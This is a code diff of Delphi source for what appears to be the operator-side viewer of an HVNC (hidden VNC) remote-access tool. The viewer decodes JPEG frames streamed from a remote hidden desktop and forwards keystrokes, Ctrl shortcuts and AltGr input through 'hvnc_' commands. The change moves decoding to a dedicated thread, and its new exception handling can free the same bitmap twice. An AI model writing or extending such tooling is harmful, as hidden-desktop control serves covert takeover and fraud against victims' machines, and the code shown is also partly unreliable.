@@ -14,6 +14,17 @@ type
   TSendJSONProc   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TUnregisterProc = procedure(aLine: TncLine) of object;
 
+  TForm10 = class;
+
+  TDecodeThread = class(TThread)
+  private
+    FForm: TForm10;
+  protected
+    procedure Execute; override;
+  public
+    constructor Create(AForm: TForm10);
+  end;
+
   TForm10 = class(TForm)
     Panel1    : TPanel;
     StatusBar1: TStatusBar;
@@ -58,9 +69,12 @@ type
     FPendingDirtyY     : Integer;
     FPendingDirtyW     : Integer;
     FPendingDirtyH     : Integer;
-    FPendingFPS        : Integer;
+    FPendingFPS         : Integer;
     FHasFrame    : Boolean;
     FIsDecoding  : Boolean;
+
+    FDecodeThread: TDecodeThread;
+    FDecodeEvent : TEvent;
 
     FBitmap      : TBitmap;
     FBitmapLock  : TCriticalSection;
@@ -119,7 +133,7 @@ function TForm10.GetCharFromKey(Key: Word; out CharCode: Word): Boolean;
 var
   State: TKeyboardState;
   ScanCode: UINT;
-  OutChar: Char;
+  OutChar: Word;
 begin
   Result := False;
   CharCode := 0;
@@ -136,7 +150,7 @@ begin
   GetKeyboardState(State);
   if ToAscii(Key, ScanCode, State, @OutChar, 0) = 1 then
   begin
-    CharCode := Ord(OutChar);
+    CharCode := OutChar;
     Result := True;
   end;
 end;
@@ -165,6 +179,9 @@ begin
   KeyPreview      := True;
   FCharKeyDown    := [];
 
+  FDecodeEvent  := TEvent.Create(nil, False, False, '');
+  FDecodeThread := TDecodeThread.Create(Self);
+
   ComboBox1.Items.Clear;
   ComboBox1.Items.Add('10%');
   ComboBox1.Items.Add('20%');
@@ -191,6 +208,14 @@ end;
 
 destructor TForm10.Destroy;
 begin
+  if Assigned(FDecodeThread) then
+  begin
+    FDecodeThread.Terminate;
+    FDecodeEvent.SetEvent;
+    FDecodeThread.WaitFor;
+    FreeAndNil(FDecodeThread);
+  end;
+  FDecodeEvent.Free;
   FBitmap.Free;
   FBitmapLock.Free;
   FLock.Free;
@@ -345,114 +370,120 @@ begin
     FPendingDirtyH      := DirtyH;
     FPendingFPS         := FPS;
     FHasFrame           := True;
-    if FIsDecoding then Exit;
-    FIsDecoding := True;
+    FDecodeEvent.SetEvent;
   finally
     FLock.Leave;
   end;
+end;
 
-  TThread.CreateAnonymousThread(
-    procedure
-    var
-      LocalBytes : TBytes;
-      LocalWidth : Integer;
-      LocalHeight: Integer;
-      LocalFormat: Integer;
-      LocalDirtyX: Integer;
-      LocalDirtyY: Integer;
-      LocalDirtyW: Integer;
-      LocalDirtyH: Integer;
-      LocalFPS   : Integer;
-      MS         : TMemoryStream;
-      JPG        : TJPEGImage;
-      TempBmp    : TBitmap;
+{ TDecodeThread }
+
+constructor TDecodeThread.Create(AForm: TForm10);
+begin
+  inherited Create(False);
+  FForm := AForm;
+  FreeOnTerminate := False;
+end;
+
+procedure TDecodeThread.Execute;
+var
+  LocalBytes : TBytes;
+  LocalWidth, LocalHeight, LocalFormat: Integer;
+  LocalDirtyX, LocalDirtyY, LocalDirtyW, LocalDirtyH: Integer;
+  LocalFPS: Integer;
+  MS: TMemoryStream;
+  JPG: TJPEGImage;
+  TempBmp: TBitmap;
+begin
+  MS := TMemoryStream.Create;
+  JPG := TJPEGImage.Create;
+  try
+    while not Terminated do
     begin
-      while True do
-      begin
-        FLock.Enter;
+      if FForm.FDecodeEvent.WaitFor(INFINITE) <> wrSignaled then Continue;
+      if Terminated then Break;
+
+      FForm.FLock.Enter;
+      try
+        LocalBytes  := FForm.FPendingBytes;
+        LocalWidth  := FForm.FPendingFrameWidth;
+        LocalHeight := FForm.FPendingFrameHeight;
+        LocalFormat := FForm.FPendingFrameFormat;
+        LocalDirtyX := FForm.FPendingDirtyX;
+        LocalDirtyY := FForm.FPendingDirtyY;
+        LocalDirtyW := FForm.FPendingDirtyW;
+        LocalDirtyH := FForm.FPendingDirtyH;
+        LocalFPS    := FForm.FPendingFPS;
+
+        FForm.FPendingBytes := nil;
+        FForm.FHasFrame     := False;
+      finally
+        FForm.FLock.Leave;
+      end;
+
+      if Length(LocalBytes) = 0 then Continue;
+
+      TempBmp := TBitmap.Create;
+      try
+        MS.Clear;
+        MS.WriteBuffer(LocalBytes[0], Length(LocalBytes));
+        MS.Position := 0;
         try
-          if not FHasFrame then
-          begin
-            FIsDecoding := False;
-            Exit;
-          end;
-          LocalBytes  := FPendingBytes;
-          LocalWidth  := FPendingFrameWidth;
-          LocalHeight := FPendingFrameHeight;
-          LocalFormat := FPendingFrameFormat;
-          LocalDirtyX := FPendingDirtyX;
-          LocalDirtyY := FPendingDirtyY;
-          LocalDirtyW := FPendingDirtyW;
-          LocalDirtyH := FPendingDirtyH;
-          LocalFPS    := FPendingFPS;
+          JPG.LoadFromStream(MS);
+          TempBmp.Assign(JPG);
 
-          FPendingBytes := nil;
-          FHasFrame     := False;
-        finally
-          FLock.Leave;
-        end;
-
-        if Length(LocalBytes) = 0 then Continue;
-
-        TempBmp := TBitmap.Create;
-        MS      := TMemoryStream.Create;
-        JPG     := TJPEGImage.Create;
-        try
-          MS.WriteBuffer(LocalBytes[0], Length(LocalBytes));
-          MS.Position := 0;
-          try
-            JPG.LoadFromStream(MS);
-            TempBmp.Assign(JPG);
-
-            TThread.Synchronize(nil,
-              procedure
+          TThread.Queue(nil,
+            procedure
+            begin
+              if (csDestroying in FForm.ComponentState) then
               begin
-                if (csDestroying in ComponentState) then Exit;
+                TempBmp.Free;
+                Exit;
+              end;
 
-                FBitmapLock.Enter;
-                try
-                  if (LocalWidth <= 0) or (LocalHeight <= 0) then
+              FForm.FBitmapLock.Enter;
+              try
+                if (LocalWidth <= 0) or (LocalHeight <= 0) then
+                  FForm.FBitmap.Assign(TempBmp)
+                else if (LocalFormat = HVNC_FRAME_FORMAT_JPEG_DIRTY) then
+                begin
+                  if (FForm.FBitmap.Width <> LocalWidth) or (FForm.FBitmap.Height <> LocalHeight) then
                   begin
-                    FBitmap.Assign(TempBmp);
-                  end
-                  else if (LocalFormat = HVNC_FRAME_FORMAT_JPEG_DIRTY) then
-                  begin
-                    if (FBitmap.Width <> LocalWidth) or (FBitmap.Height <> LocalHeight) then
-                    begin
-                      FBitmap.PixelFormat := pf24bit;
-                      FBitmap.SetSize(LocalWidth, LocalHeight);
-                      FBitmap.Canvas.Brush.Color := clBlack;
-                      FBitmap.Canvas.FillRect(Rect(0, 0, LocalWidth, LocalHeight));
-                    end;
-
-                    if (LocalDirtyW <= 0) or (LocalDirtyH <= 0) then
-                      FBitmap.Canvas.Draw(LocalDirtyX, LocalDirtyY, TempBmp)
-                    else
-                      FBitmap.Canvas.StretchDraw(Rect(LocalDirtyX, LocalDirtyY,
-                        LocalDirtyX + LocalDirtyW, LocalDirtyY + LocalDirtyH), TempBmp);
-                  end
-                  else
-                  begin
-                    FBitmap.Assign(TempBmp);
+                    FForm.FBitmap.PixelFormat := pf24bit;
+                    FForm.FBitmap.SetSize(LocalWidth, LocalHeight);
+                    FForm.FBitmap.Canvas.Brush.Color := clBlack;
+                    FForm.FBitmap.Canvas.FillRect(Rect(0, 0, LocalWidth, LocalHeight));
                   end;
 
-                  FLastWidth  := FBitmap.Width;
-                  FLastHeight := FBitmap.Height;
-                finally
-                  FBitmapLock.Leave;
-                end;
-                PaintBox1.Invalidate;
-                UpdateFrameStatus(LocalFPS);
-              end);
-          except
-          end;
-        finally
-          JPG.Free;
-          MS.Free;
+                  if (LocalDirtyW <= 0) or (LocalDirtyH <= 0) then
+                    FForm.FBitmap.Canvas.Draw(LocalDirtyX, LocalDirtyY, TempBmp)
+                  else
+                    FForm.FBitmap.Canvas.StretchDraw(Rect(LocalDirtyX, LocalDirtyY,
+                      LocalDirtyX + LocalDirtyW, LocalDirtyY + LocalDirtyH), TempBmp);
+                end
+                else
+                  FForm.FBitmap.Assign(TempBmp);
+
+                FForm.FLastWidth  := FForm.FBitmap.Width;
+                FForm.FLastHeight := FForm.FBitmap.Height;
+              finally
+                FForm.FBitmapLock.Leave;
+                TempBmp.Free;
+              end;
+              FForm.PaintBox1.Invalidate;
+              FForm.UpdateFrameStatus(LocalFPS);
+            end);
+        except
           TempBmp.Free;
         end;
+      except
+        TempBmp.Free;
       end;
-    end).Start;
+    end;
+  finally
+    JPG.Free;
+    MS.Free;
+  end;
 end;
 
 // -------------------------------------------------------------------------
@@ -733,19 +764,34 @@ procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
 var
   OriginalKey: Word;
   CharCode: Word;
+  IsCtrl, IsAlt: Boolean;
 begin
   if not FPaintBoxActive then Exit;
 
   OriginalKey := Key;
 
+  IsCtrl := (GetKeyState(VK_CONTROL) < 0);
+  IsAlt  := (GetKeyState(VK_MENU) < 0);
+
   // Enter / Space'in UI butonunu tetiklemesini engelle
   if (Key = VK_RETURN) or (Key = VK_SPACE) then
     Key := 0;
 
+  // AltGr handling
+  if (OriginalKey = VK_MENU) and (GetKeyState(VK_RMENU) < 0) then
+    OriginalKey := VK_RMENU;
+
+  // CTRL Shortcuts
+  if IsCtrl and (OriginalKey in [Ord('A'), Ord('C'), Ord('V'), Ord('X'), Ord('Z')]) then
+  begin
+    SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
+    Exit;
+  end;
+
   if GetCharFromKey(OriginalKey, CharCode) then
   begin
     // Yalnızca yazdırılabilir karakterleri (boşluk dahil >= 32) hvnc_char gönder
-    if CharCode >= 32 then
+    if (CharCode >= 32) and not IsCtrl and not IsAlt then
     begin
       SendControlCommand('hvnc_char', -1, -1, -1, CharCode, True);
       Include(FCharKeyDown, OriginalKey);
@@ -765,17 +811,23 @@ end;
 
 procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word;
   Shift: TShiftState);
+var
+  OriginalKey: Word;
 begin
   if not FPaintBoxActive then Exit;
+  OriginalKey := Key;
+
+  if (OriginalKey = VK_MENU) and (GetKeyState(VK_RMENU) < 0) then
+    OriginalKey := VK_RMENU;
 
   // Eğer tuş hvnc_char ile gönderildiyse keyup atlanır
-  if Key in FCharKeyDown then
+  if OriginalKey in FCharKeyDown then
   begin
-    Exclude(FCharKeyDown, Key);
+    Exclude(FCharKeyDown, OriginalKey);
     Exit;
   end;
 
-  SendControlCommand('hvnc_keyup', -1, -1, -1, Key, True);
+  SendControlCommand('hvnc_keyup', -1, -1, -1, OriginalKey, True);
 end;
 
 procedure TForm10.FormKeyPress(Sender: TObject; var Key: Char);
